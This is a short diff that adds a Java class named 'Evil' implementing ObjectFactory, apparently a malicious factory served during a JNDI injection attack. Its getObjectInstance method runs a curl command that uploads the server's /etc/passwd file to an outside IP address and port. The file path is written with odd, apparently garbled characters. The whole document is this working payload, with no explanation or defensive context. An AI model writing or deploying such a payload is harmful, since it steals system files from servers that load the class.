@@ -1,0 +1,7 @@
+public class Evil implements ObjectFactory  {
+   @Override
+   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
+       Runtime.getRuntime().exec("curl -F 'file=@/etc/passw‍đ' http://3.16.46.249:45856/");
+       return  null;
+   }
+}
